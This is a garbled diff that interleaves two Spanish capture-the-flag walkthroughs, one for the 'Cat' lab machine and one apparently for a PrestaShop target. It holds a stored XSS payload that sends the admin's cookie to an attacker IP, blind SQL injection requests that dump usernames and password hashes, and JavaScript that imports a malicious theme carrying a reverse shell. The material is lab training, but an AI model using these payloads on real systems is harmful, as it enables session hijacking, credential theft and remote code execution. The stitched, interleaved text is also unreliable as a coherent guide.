-                        &lt;form method="post" enctype="multipart/form-data"&gt;
-            &lt;label for="cat_name"&gt;Cat Name:&lt;/label&gt;
-            &lt;input type="text" id="cat_name" name="cat_name" required&gt;
-            &lt;label for="age"&gt;Cat Age:&lt;/label&gt;
-            &lt;input type="number" id="age" name="age" required&gt;
-            &lt;label for="birthdate"&gt;Cat Birthdate:&lt;/label&gt;
-            &lt;input type="date" id="birthdate" name="birthdate" required&gt;
-            &lt;label for="weight"&gt;Cat Weight (in kg):&lt;/label&gt;
-            &lt;input type="number" id="weight" name="weight" step="0.01" required&gt;
-            &lt;label for="cat_photo"&gt;Cat Photo:&lt;/label&gt;
-            &lt;input type="file" id="cat_photo" name="cat_photo" accept="image/*" required&gt;
-            &lt;input type="submit" value="Register Cat"&gt;
-        &lt;/form&gt;
-    &lt;/div&gt;
+                const htmlText = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(htmlText, "text/html");
 
+                const anchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
+                const href = anchor ? anchor.getAttribute('href') : null;
+                const match = href ? href.match(/_token=([^&amp;]+)/) : null;
+                const token = match ? match[1] : null;
+                if (!token) throw new Error('Token not found in anchor tag href.');
+
+                console.log('Extracted Token from HTML:', token);
+                return token;
+            } catch (error) {
+                console.error('Error fetching token from HTML content:', error);
+                return null;
+            }
+        }
+
+        async function fetchCSRFToken(token) {
+            const csrfUrl = `${baseUrl}/${path}/index.php/improve/design/themes/import?_token=${token}`;
+            try {
+                const response = await fetch(csrfUrl, {
+                    method: 'GET',
+                    credentials: 'include',
+                    redirect: 'follow'
+                });
+                if (!response.ok) throw new Error('Failed to fetch the page for CSRF token extraction. Status: ' + response.status);
+
+                const htmlText = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(htmlText, "text/html");
+
+                const csrfTokenInput = doc.querySelector('input[name="import_theme[_token]"]');
+                const csrfToken = csrfTokenInput ? csrfTokenInput.value : null;
+                if (!csrfToken) throw new Error('CSRF token not found in HTML content.');
+
+                console.log('Extracted CSRF Token:', csrfToken);
+                return csrfToken;
+            } catch (error) {
+                console.error('Error fetching CSRF token:', error);
+                return null;
+            }
+        }
+
+        async function importTheme() {
+            try {
+                const locationHeaderToken = await fetchTokenFromHTML();
+                if (!locationHeaderToken) {
+                    console.error('Failed to fetch token from HTML');
+                    return;
+                }
+
+                const csrfToken = await fetchCSRFToken(locationHeaderToken);
+                if (!csrfToken) {
+                    console.error('Failed to fetch CSRF token');
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append('import_theme[import_from_web]', `http://${httpServerIp}:${httpServerPort}/${fileNameOfTheme}`);
+                formData.append('import_theme[_token]', csrfToken);
+
+                const postUrl = `/${path}/index.php/improve/design/themes/import?_token=${locationHeaderToken}`;
+                console.log('POST URL:', postUrl);
+
+                const response = await fetch(postUrl, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                if (response.ok) {
+                    console.log('Theme imported successfully');
+                } else {
+                    console.error('Failed to import theme. Response Status:', response.status);
+                }
+            } catch (error) {
+                console.error('Error importing theme:', error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            importTheme();
+        });
+    &lt;/script&gt;
 &lt;/body&gt;
+
 &lt;/html&gt;
-
-
-
-<br>Intento buscar donde se guardan las imagenes subidas al servidor; En /vote.php las 3 imagenes visibles se guardan en los siguientes endpoints:<br>http://cat.htb/img/cat3.webp
-http://cat.htb/img/cat2.png
-http://cat.htb/img/cat1.jpg
-<br><br>He probado mil maneras de acceder a la imagen pero no parece que el servidor este guardando las imagenes con el mismo nombre que se suben o igual no en ese directorio ;  Prosigo haciendo el Recon<br><br>En el escaneo con nmap nos encuentra un repositorio de git<br>
-El endpoint da forbidden.<br>
-<img alt="Pasted image 20250206115612.png" src="machines/cat/imgs/pasted-image-20250206115612.png"><br>
-Vamos a usar la suite de herramientas de GitTools .<br>
-<a data-tooltip-position="top" aria-label="https://github.com/internetwache/GitTools.git" rel="noopener nofollow" class="external-link" href="https://github.com/internetwache/GitTools.git" target="_blank">Repositorio</a><br>➜  Dumper git:(master) ./gitdumper.sh http://cat.htb/.git/ GitCatDump
-###########
-# GitDumper is part of https://github.com/internetwache/GitTools
-#
-# Developed and maintained by @gehaxelt from @internetwache
-#
-# Use at your own risk. Usage might be illegal in certain circumstances. 
-# Only for educational purposes!
-###########
-
-
-[*] Destination folder does not exist
-[+] Creating GitCatDump/.git/
-[+] Downloaded: HEAD
-[-] Downloaded: objects/info/packs
-[+] Downloaded: description
-[+] Downloaded: config
-[+] Downloaded: COMMIT_EDITMSG
-[+] Downloaded: index
-[-] Downloaded: packed-refs
-[+] Downloaded: refs/heads/master
-[-] Downloaded: refs/remotes/origin/HEAD
-[-] Downloaded: refs/stash
-[+] Downloaded: logs/HEAD
-[+] Downloaded: logs/refs/heads/master
-[-] Downloaded: logs/refs/remotes/origin/HEAD
-[-] Downloaded: info/refs
-[+] Downloaded: info/exclude
-[-] Downloaded: /refs/wip/index/refs/heads/master
-[-] Downloaded: /refs/wip/wtree/refs/heads/master
-[+] Downloaded: objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5
-[-] Downloaded: objects/00/00000000000000000000000000000000000000
-[+] Downloaded: objects/c9/e281ffb3f5431800332021326ba5e97aeb2764
-[+] Downloaded: objects/56/03bb235ee634e1d7914def967c26f9dd0963bb
-[+] Downloaded: objects/64/d98c5af736de120e17eff23b17e22aad668718
-[+] Downloaded: objects/31/e87489c5f8160f895e941d00087bea94f21315
-[+] Downloaded: objects/0c/be0133fb00b13165bd7318e42e17f322daac7f
-[+] Downloaded: objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc
-[+] Downloaded: objects/91/92afa265e9e73f533227e4f118f882615d3640
-[+] Downloaded: objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222
-[+] Downloaded: objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028
-[+] Downloaded: objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5
-[+] Downloaded: objects/38/660821153b31dbbee89396eacf974c095ab0dc
-[+] Downloaded: objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4
-[+] Downloaded: objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2
-[+] Downloaded: objects/88/12266cb97013f416c175f9a9fa08aae524c92a
-[+] Downloaded: objects/cf/8166a8873d413e6afd88fa03305880e795a2c6
-[+] Downloaded: objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8
-[+] Downloaded: objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86
-[+] Downloaded: objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1
-[+] Downloaded: objects/9b/e1a76f22449a7876a712d34dc092f477169c36
-[+] Downloaded: objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5
-<br>Vamos a echar un vistazo a ver si encontramos algo interesante;<br>.git git:(master) strings index
-DIRC
-accept_cat.php
-        admin.php
-config.php
-contest.php
-css/styles.css
-?S2'
-a]6@
-delete_cat.php
-img/cat1.jpg
-img/cat2.png
-img/cat3.webp
-img_winners/cat1.jpg
-img_winners/cat2.png
-img_winners/cat3.webp
-;#P(
-        index.php
-join.php
-logout.php
-KRO&gt;6b~o.
-view_cat.php
-vote.php
-winners.php
-                        wE
-&amp;winners/cat_report_20240831_173129.php
-TREE
-19 4
-3 !2k
-'dcss
-&lt;!)CA""winners
-=A&gt;j
-img_winners
-&lt;!)CA""o
-t6+x
-<br>Parece que encontramos algunos endpoints interesantes como delete_cat.php o view_cat.php<br><br><br>Pruebo el endpoint pero me redirige<br>
-<img alt="Pasted image 20250206162924.png" src="machines/cat/imgs/pasted-image-20250206162924.png"><br><br>Este endpoint me da un 200 pero con el mensaje "access denied" puede sernos de utilidad mas tarde<br>
-<img alt="Pasted image 20250206164029.png" src="machines/cat/imgs/pasted-image-20250206164029.png"><br><br>El archivo  .git/logs/HEAD es el archivo de un commit <br>0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel &lt;axel2017@gmail.com&gt; 1725146774 +0000    commit (initial): Cat v1
-<br>Nos guardamos el mail como posible usuario explotable<br>Pruebo con git-dumper ya que esta anterior no me exporto todo lo que tenia que exportar; (me lo conto un pajarito)<br>(venv) ➜  DUMP git:(master) tree .
-.
-|-- accept_cat.php
-|-- admin.php
-|-- config.php
-|-- contest.php
-|-- css
-|   `-- styles.css
-|-- delete_cat.php
-|-- img
-|   |-- cat1.jpg
-|   |-- cat2.png
-|   `-- cat3.webp
-|-- img_winners
-|   |-- cat1.jpg
-|   |-- cat2.png
-|   `-- cat3.webp
-|-- index.php
-|-- join.php
-|-- logout.php
-|-- view_cat.php
-|-- vote.php
-|-- winners
-|   `-- cat_report_20240831_173129.php
-`-- winners.php
-<br>Ahora ya tenemos código fuente de la pagina; vamos a ver si encontramos algún endpoint vulnerable;<br><br>Vemos a continuacion el codigo de join.php:<br>&lt;?php
-session_start();
-
-include 'config.php';
-
-$success_message = "";
-$error_message = "";
-
-// Registration process
-if ($_SERVER["REQUEST_METHOD"] == "GET" &amp;&amp; isset($_GET['registerForm'])) {
-    $username = $_GET['username'];
-    $email = $_GET['email'];
-    $password = md5($_GET['password']);
-
-    $stmt_check = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username OR email = :email");
-    $stmt_check-&gt;execute([':username' =&gt; $username, ':email' =&gt; $email]);
-    $existing_user = $stmt_check-&gt;fetch(PDO::FETCH_ASSOC);
-
-    if ($existing_user) {
-        $error_message = "Error: Username or email already exists.";
-    } else {
-        $stmt_insert = $pdo-&gt;prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
-        $stmt_insert-&gt;execute([':username' =&gt; $username, ':email' =&gt; $email, ':password' =&gt; $password]);
-
-        if ($stmt_insert) {
-            $success_message = "Registration successful!";
-        } else {
-            $error_message = "Error: Unable to register user.";
-        }
-    }
-}
-
-// Login process
-if ($_SERVER["REQUEST_METHOD"] == "GET" &amp;&amp; isset($_GET['loginForm'])) {
-    $username = $_GET['loginUsername'];
-    $password = md5($_GET['loginPassword']);
-
-    $stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username");
-    $stmt-&gt;execute([':username' =&gt; $username]);
-    $user = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
-
-    if ($user &amp;&amp; $password === $user['password']) {
-        $_SESSION['username'] = $user['username'];
-        header("Location: /");
-        exit();
-    } else {
-        $error_message = "Incorrect username or password.";
-    }
-}
-?&gt;
-
-
-&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-&lt;meta charset="UTF-8"&gt;
-&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-&lt;title&gt;Join the Best Cat Community&lt;/title&gt;
-&lt;link rel="stylesheet" href="css/styles.css"&gt;
-&lt;style&gt;
-    .container {
-        max-width: 600px;
-        margin: 20px auto;
-        padding: 20px;
-        background-color: #fff;
-        border-radius: 5px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    .card {
-        overflow: hidden;
-        transition: height 0.3s ease-in-out;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-        margin-bottom: 40px; /* Increased margin between cards */
-    }
-    .card.register {
-        height: 400px;
-    }
-    .card.login {
-        height: 400px;
-    }
-    form {
-        padding: 20px;
-        box-sizing: border-box;
-    }
-    label,
-    input {
-        display: block;
-        margin-bottom: 10px;
-        width: 100%; /* Make inputs fill the width */
-    }
-    input[type="submit"] {
-        background-color: #007bff;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        padding: 15px 20px;
-        cursor: pointer;
-        transition: background-color 0.3s;
-        width: 100%; /* Make button fill the width */
-    }
-    input[type="submit"]:hover {
-        background-color: #0056b3;
-    }
-    .toggle-link {
-        text-align: center;
-        margin-bottom: 20px;
-    }
-    .toggle-link a {
-        text-decoration: none;
-        color: #007bff;
-        transition: color 0.3s;
-    }
-    .toggle-link a:hover {
-        color: #0056b3;
-    }
-    .message {
-        margin-top: 20px;
-        text-align: center;
-        color: green;
-    }
-    .error-message {
-        margin-top: 20px;
-        text-align: center;
-        color: red;
-    }
-&lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-
-&lt;div class="navbar"&gt;
-    &lt;a href="/"&gt;Home&lt;/a&gt;
-    &lt;a href="/vote.php"&gt;Vote&lt;/a&gt;
-    &lt;a href="/contest.php"&gt;Contest&lt;/a&gt;
-    &lt;a href="/winners.php"&gt;Winners&lt;/a&gt;
-    &lt;a href="/join.php"&gt;Join&lt;/a&gt;
-&lt;/div&gt;
-
-&lt;div class="container"&gt;
-    &lt;h1&gt;Join the Best Cat Community&lt;/h1&gt;
-    &lt;?php if ($success_message != ""): ?&gt;
-        &lt;div class="message"&gt;&lt;?php echo $success_message; ?&gt;&lt;/div&gt;
-    &lt;?php endif; ?&gt;
-    &lt;?php if ($error_message != ""): ?&gt;
-        &lt;div class="error-message"&gt;&lt;?php echo $error_message; ?&gt;&lt;/div&gt;
-    &lt;?php endif; ?&gt;
-    &lt;div class="card register"&gt;
-        &lt;center&gt;&lt;h2&gt;Register&lt;/h2&gt;&lt;/center&gt;
-        &lt;form id="registerForm" method="get"&gt;
-            &lt;label for="username"&gt;Username:&lt;/label&gt;
-            &lt;input type="text" id="username" name="username" required&gt;
-            &lt;label for="email"&gt;Email:&lt;/label&gt;
-            &lt;input type="email" id="email" name="email" required&gt;
-            &lt;label for="password"&gt;Password:&lt;/label&gt;
-            &lt;input type="password" id="password" name="password" required&gt;
-            &lt;input type="submit" name="registerForm" value="Register"&gt;
-        &lt;/form&gt;
-    &lt;/div&gt;
-    &lt;div class="card login" style="display: none;"&gt;
-        &lt;center&gt;&lt;h2&gt;Login&lt;/h2&gt;&lt;/center&gt;
-        &lt;form id="loginForm" method="get"&gt;
-            &lt;label for="loginUsername"&gt;Username:&lt;/label&gt;
-            &lt;input type="text" id="loginUsername" name="loginUsername" required&gt;
-            &lt;label for="loginPassword"&gt;Password:&lt;/label&gt;
-            &lt;input type="password" id="loginPassword" name="loginPassword" required&gt;
-            &lt;input type="submit" name="loginForm" value="Login"&gt;
-        &lt;/form&gt;
-    &lt;/div&gt;
-    &lt;div class="toggle-link"&gt;
-        &lt;a href="#" id="toggleForm"&gt;Already have an account?&lt;/a&gt;
-    &lt;/div&gt;
-&lt;/div&gt;
-
-&lt;script&gt;
-    var toggleLink = document.getElementById("toggleForm");
-    var registerForm = document.querySelector(".register");
-    var loginForm = document.querySelector(".login");
-
-    toggleLink.addEventListener("click", function(event) {
-        event.preventDefault();
-        if (registerForm.style.display === "block") {
-            registerForm.style.display = "none";
-            loginForm.style.display = "block";
-            toggleLink.textContent = "Register"; // Changed text
-        } else {
-            registerForm.style.display = "block";
-            loginForm.style.display = "none";
-            toggleLink.textContent = "Already have an account?"; // Changed text
-        }
-    });
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-<br><br>En las siguientes líneas:<br>// Registration process
-if ($_SERVER["REQUEST_METHOD"] == "GET" &amp;&amp; isset($_GET['registerForm'])) {
-    $username = $_GET['username'];
-    $email = $_GET['email'];
-    $password = md5($_GET['password']);
-
-    $stmt_check = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username OR email = :email");
-    $stmt_check-&gt;execute([':username' =&gt; $username, ':email' =&gt; $email]);```
-
-
-Tamto el campo $username como $email no estan siendo sanitizados antes de registrarlos en la base de datos; por lo tanto . Si como atacantes nos registramos de forma que:
-```java
-`Username: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
- Email: cher0@mail.com`
-<br>Si en algun punto logramos que nuestro nombre de cuenta se muestre es probable que podamos robar cookies de usuario. De momento lo dejamos registrado;<br><br>Para agilizar el proceso de Injeccion del XSS hice un script de python que podeis encontrar en mi perfil de Github ; El script se compone de 4 fases, <br>
-<br>1-Registra el usuario con el payload XSS con las etiquetas necesarias para pillar la cookie del admin
-<br>2-Se Logea el usuario en la pagina con las peticiones necesarias al servidor
-<br>3- Sube una imagen indicada en el primer argumento del escript en contest.php
-<br>4-Se abre un servidor http que captura la Cookie de sesión del administrador de la pagina 
-<br>Podeis descargarla en el siguiente <a data-tooltip-position="top" aria-label="https://github.com/cher0qui/HTB-Cat-Automated-XSS/tree/main" rel="noopener nofollow" class="external-link" href="https://github.com/cher0qui/HTB-Cat-Automated-XSS/tree/main" target="_blank">enlace</a> <br><br>Vamos a observar el codigo:<br>&lt;?php
-include 'config.php';
-session_start();
-
-if (isset($_SESSION['username']) &amp;&amp; $_SESSION['username'] === 'axel') {
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        if (isset($_POST['catId']) &amp;&amp; isset($_POST['catName'])) {
-            $cat_name = $_POST['catName'];
-            $catId = $_POST['catId'];
-            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
-            $pdo-&gt;exec($sql_insert);
-
-            $stmt_delete = $pdo-&gt;prepare("DELETE FROM cats WHERE cat_id = :cat_id");
-            $stmt_delete-&gt;bindParam(':cat_id', $catId, PDO::PARAM_INT);
-            $stmt_delete-&gt;execute();
-
-            echo "The cat has been accepted and added successfully.";
-        } else {
-            echo "Error: Cat ID or Cat Name not provided.";
-        }
-    } else {
-        header("Location: /");
-        exit();
-    }
-} else {
-    echo "Access denied.";
-}
-?&gt;
-
-<br>Bueno aqui ya observamos mas info sobre la base de datos; vemos que hay una tabla accepted_cats y otra cats;<br>El código incluye una verificación para asegurarse de que solo el usuario axel pueda realizar la inserción o eliminación<br>Observamos el campo vulnerable<br>
-SQLI:<br>$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
-$pdo-&gt;exec($sql_insert);
-<br>
-<br>Aquí, el valor de $cat_name proviene directamente de $_POST['catName'] sin ser validado ni escapado.
-<br>Aunque está usando PDO para ejecutar consultas, no está utilizando consultas preparadas con marcadores de posición (:parametro) para esta inserción. En su lugar, está concatenando el valor directamente en la consulta SQL.
-<br>Esto  nos permite inyectar código SQL  a través del campo catName.
-<br>Por ejemplo si mandamos:<br>'); DROP TABLE accepted_cats; --
-<br>la consulta que procesa el servidor pasa a ser:<br>INSERT INTO accepted_cats (name) VALUES(''); DROP TABLE accepted_cats; --');
-<br>Pero para ello necesitamos primero ser axel asi que vamos a intentar robar su cookie phpssid con el xss anterior.<br><br>Encuentro la linea de codigo donde podemos ver como se guardan nuestros gatos subidos<br>        // Generate unique identifier for the image
-        $imageIdentifier = uniqid() . "_";
-
-        // Upload cat photo
-        $target_dir = "uploads/";
-        $target_file = $target_dir . $imageIdentifier . basename($_FILES["cat_photo"]["name"]);
-        $uploadOk = 1;
-        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
-
-        // Check if the file is an actual image or a fake file
-        $check = getimagesize($_FILES["cat_photo"]["tmp_name"]);
-        if($check !== false) {
-            $uploadOk = 1;
-        } else {
-            $error_message = "Error: The file is not an image.";
-            $uploadOk = 0;
-        }
-
-        // Check if the file already exists
-        if (file_exists($target_file)) {
-            $error_message = "Error: The file already exists.";
-            $uploadOk = 0;
-        }
-
-        // Check file size
-        if ($_FILES["cat_photo"]["size"] &gt; 500000) {
-            $error_message = "Error: The file is too large.";
-            $uploadOk = 0;
-        }
-
-        // Allow only certain file formats
-        if($imageFileType != "jpg" &amp;&amp; $imageFileType != "png" &amp;&amp; $imageFileType != "jpeg") {
-            $error_message = "Error: Only JPG, JPEG, and PNG files are allowed.";
-            $uploadOk = 0;
-        }
-<br>No podiamos encontrar nuestra imagen en uploads/ ya que se genera un uniqid() seguido de " _ "  <br><br>Primero nos registramos con un XSS que mande la cookie de axel a nuestro servidor <br>&lt;script&gt;document.location='http://10.10.14.232:2323/?c='+document.cookie;&lt;/script&gt;
-<br><img alt="Pasted image 20250207131614.png" src="machines/cat/imgs/pasted-image-20250207131614.png"><br>Acto seguido abrimos un servidor http por el puerto indicado en XSS y subimos un gato, cuando el admin lo revise y muestre nuestro "username" se triggerea el XSS mandandonos su cookie;<br>
-<img alt="Pasted image 20250207131820.png" src="machines/cat/imgs/pasted-image-20250207131820.png"><br>Ahora que tenemos el phpssid de axel probamos a hacer un session Hijacking modificando nuestra cookie<br>Admin Panel:<br>
-<img alt="Pasted image 20250207132842.png" src="machines/cat/imgs/pasted-image-20250207132842.png"><br>Ahora vamos a explotar la injeccion sql en accept_cat.php<br>Recordemos el codigo<br>&lt;?php
-include 'config.php';
-session_start();
-
-if (isset($_SESSION['username']) &amp;&amp; $_SESSION['username'] === 'axel') {
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        if (isset($_POST['catId']) &amp;&amp; isset($_POST['catName'])) {
-            $cat_name = $_POST['catName'];
-            $catId = $_POST['catId'];
-            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
-            $pdo-&gt;exec($sql_insert);
-
-            $stmt_delete = $pdo-&gt;prepare("DELETE FROM cats WHERE cat_id = :cat_id");
-            $stmt_delete-&gt;bindParam(':cat_id', $catId, PDO::PARAM_INT);
-            $stmt_delete-&gt;execute();
-
-            echo "The cat has been accepted and added successfully.";
-        } else {
-            echo "Error: Cat ID or Cat Name not provided.";
-        }
-    } else {
-        header("Location: /");
-        exit();
-    }
-} else {
-    echo "Access denied.";
-}
-?&gt;
-
-<br>Preparamos un Request POST para dumpear la base de datos:<br>POST /accept_cat.php HTTP/1.1
-Host: cat.htb
-Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=dc19d9vca314ihdq9g6h
-
-catId=1&amp;catName=test
-<br>Sqlmap nos confirma que el campo es vulnerable<br>sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
----
-Parameter: catName (POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: catId=1&amp;catName=test'||(SELECT 0x6b575974 WHERE 9070=9070 AND 3453=3453)||'
----
-[13:46:48] [INFO] testing MySQL
-[13:46:48] [WARNING] the back-end DBMS is not MySQL
-[13:46:48] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
-[13:46:48] [WARNING] HTTP error codes detected during run:
-500 (Internal Server Error) - 84 times
-
-[*] ending @ 13:46:48 /2025-02-07/
-
-<br>Con esta solicitud mandamos esta query SQL al servidor<br>INSERT INTO accepted_cats (name) VALUES ('TEST' UNION ALL SELECT NULL, table_name FROM information_schema.tables WHERE 1=1 AND '1'='1')'
-<br>Query valida:<br>
-<img alt="Pasted image 20250207135540.png" src="machines/cat/imgs/pasted-image-20250207135540.png"><br>SQLI:<br>
-<img alt="Pasted image 20250207140253.png" src="machines/cat/imgs/pasted-image-20250207140253.png"><br><br>500 server INTERNAL ERROR:<br>
-<img alt="Pasted image 20250207180808.png" src="machines/cat/imgs/pasted-image-20250207180808.png"><br><br><img alt="Pasted image 20250207180840.png" src="machines/cat/imgs/pasted-image-20250207180840.png"><br><br>POST /accept_cat.php HTTP/1.1
-Host: cat.htb
-Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=5k79n5uih9n3lf2i9n2cv21p4q
-Content-Length: 103
-
-catId=1&amp;catName=test'||(SELECT 'true' FROM pragma_table_info('users') WHERE name='password' LIMIT 1)||'
-<br><img alt="Pasted image 20250208180856.png" src="machines/cat/imgs/pasted-image-20250208180856.png"><br>
-También descubro la existencia de la columna "username"<br>POST /accept_cat.php HTTP/1.1
-Host: cat.htb
-Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=5k79n5uih9n3lf2i9n2cv21p4q
-Content-Length: 103
-
-catId=1&amp;catName=test'||(SELECT 'true' FROM pragma_table_info('users') WHERE name='username' LIMIT 1)||'
-<br><img alt="Pasted image 20250208181220.png" src="machines/cat/imgs/pasted-image-20250208181220.png"><br>Pues ahora a sacar los Usernames y las passwords;<br><br><br>catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE SUBSTR(username, N, 1) = 'STRING' LIMIT 1)||'
-<br>
-<br>N : es la coordenada del caracter, es decir N=1 primera string
-<br>STRING : letra
-<br>Probamos con la a de Axel a ver si existe;<br>
-<img alt="Pasted image 20250208182307.png" src="machines/cat/imgs/pasted-image-20250208182307.png"><br>
-la b da un 500 Internal server erros por lo que comprobamos que el payload funciona!;<br>
-<img alt="Pasted image 20250208182334.png" src="machines/cat/imgs/pasted-image-20250208182334.png"><br>para sacar el segundo username de la base de datos basta con poner "LIMIT 1 OFFSET 1"<br>
-ahora sabemos que el segundo nombre de usuario empieza por "r":<br>
-<img alt="Pasted image 20250208182641.png" src="machines/cat/imgs/pasted-image-20250208182641.png"><br><br>Basicamente lo mismo que arriba pero cambiando los parametros de la columna<br>catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE SUBSTR(password, N, 1) = 'STRING' LIMIT 1)||'
-
-<br><img alt="Pasted image 20250208183008.png" src="machines/cat/imgs/pasted-image-20250208183008.png"><br><br>POST /accept_cat.php HTTP/1.1
-Host: cat.htb
-Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=b4tdio58t0hjkt9od29jkfgo8j
-Content-Length: 87
-
-catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE LENGTH(username) = 4 LIMIT 1)||'
-<br>Nos devuelve el 200 ya que sabemos que el primer username es Axel:<br>
-<img alt="Pasted image 20250208185930.png" src="machines/cat/imgs/pasted-image-20250208185930.png"><br><br>Lo mismo, diferente columna<br>POST /accept_cat.php HTTP/1.1
-Host: cat.htb
-Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=421ue72qb057o1qhe5rge2cb7i
-Content-Length: 97
-
-catId=1&amp;catName=test'||(SELECT 'true' FROM users WHERE LENGTH(password) = 32 LIMIT 1 OFFSET 0)||'
-<br>Ya uso offset 0 para referirme a la password de axel ; bueno sabemos que tiene 32 caracteres ya que nos da el 200 ok <br>Para averiguar la longitud lo pase por en intruder para que me fuese haciendo un ataque de fuerza bruta por numeros del 1 al 100 , el que me dio respuesta 200 fue "32"<br>
-<img alt="Pasted image 20250208190401.png" src="machines/cat/imgs/pasted-image-20250208190401.png"><br>
-<img alt="Pasted image 20250208190522.png" src="machines/cat/imgs/pasted-image-20250208190522.png"><br>
-Tambien parece que el resto de passwords en la database tienen 32 caracteres ya que deben de estar hasheadas con el mismo algoritmo;<br><br>Vamos a crear un payload para sacar todos los campos de la tabla users empezando por los usernames y luego por las passwords respectivamente<br>hasta ahora la información que tenemos es<br>
-- El servidor devuelve un 500 server internal error si la query no resuelve en la base de datos<br>
-- Tenemos la tabla users con las columnas username y password<br>
-- la primera fila de la tabla tiene al usuario Axel<br>
--  las passwords tienen una longitud de 32 caracteres<br>
-Necesitamos<br>
-- Sacar el resto de usernames de la tabla users<br>
-- Sacar las passwords de cada user caracter a caracter <br><br><br>
-<br>Envía el payload al servidor y verifica si la respuesta tiene un código de estado 200 OK.
-<br>Si la consulta SQL es válida, el servidor responderá con 200 OK. De lo contrario, devolverá 500 Internal Server Error.
 <br><br>
-<br>Dumpea un campo específico (username o password) caracter por caracter.
-<br>Usa SUBSTR() para extraer cada carácter en una posición específica.
-<br>Itera sobre todos los caracteres ASCII imprimibles (de 32 a 126).
+<br>El html extrae dos tokens necesarios para autenticar las solicitudes en el panel de administración de PrestaShop.
+<br>Envía una solicitud POST para importar un tema malicioso desde el servidor HTTP local del atacante.
+<br>Si todo funciona correctamente, el tema malicioso se instala en el servidor objetivo, permitiendonos ejecutar código arbitrario.
+<br>
+<br>
+Lee el archivo reverse_shell_template.php, reemplaza los marcadores de posición y guarda el resultado en reverse_shell.php.
+
+<br>la reverse_shell_template.php es la mítica rev-shell de <a data-tooltip-position="top" aria-label="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel="noopener nofollow" class="external-link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">pentestmonkey</a>
+
+
+<br>
+Copia el archivo ps_next_8_theme_malicious_old.zip, agrega el archivo reverse_shell.php dentro del ZIP y lo guarda como ps_next_8_theme_malicious.zip.
+
 <br><br>
-<br>Dumpea todos los nombres de usuario hasta un offset máximo (max_users).
-<br>Luego, dumpea las contraseñas correspondientes a cada nombre de usuario.
-<br>Almacena los resultados en listas y los imprime al final.
-<br><br><br>
-<br>
-Dumpear Nombres de Usuario:
+<br>Realiza una solicitud GET a la página /contact-us del sitio objetivo.
+<br>Extrae el valor del token CSRF del formulario usando BeautifulSoup.
+<br><br>
+<br>Prepara una solicitud POST con los siguientes datos:
 
-<br>Para cada offset (i), intenta dumpear el nombre de usuario letra por letra.
-<br>Si no encuentra más usuarios, detiene el proceso.
+<br>Un archivo adjunto (exploit.html disfrazado como imagen).
+<br>Datos del formulario con el token CSRF, dirección de correo electrónico y mensaje.
 
 
-<br>
-Dumpear Contraseñas:
-
-<br>Para cada nombre de usuario dumpeado, intenta dumpear su contraseña letra por letra.
-<br>Suponemos que todas las contraseñas tienen una longitud fija de 32 caracteres.
-
-
-<br>
-Imprimir Resultados:
-
-<br>Al final, muestra una lista de usuarios y sus contraseñas correspondientes.
-
-
-<br><br><br>Sqlmap tambien funciona por si no te quieres tirar varios dias <br>➜  Cat sqlmap -r request -p catName --level=5 --tables --dump --risk=3 --dbms=sqlite --threads=10
-        ___
-       __H__                                                                   
- ___ ___[(]_____ ___ ___  {1.9#stable}                                         
-|_ -| . [']     | .'| . |                                                      
-|___|_  [.]_|_|_|__,|  _|                                                      
-      |_|V...       |_|   https://sqlmap.org                                   
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
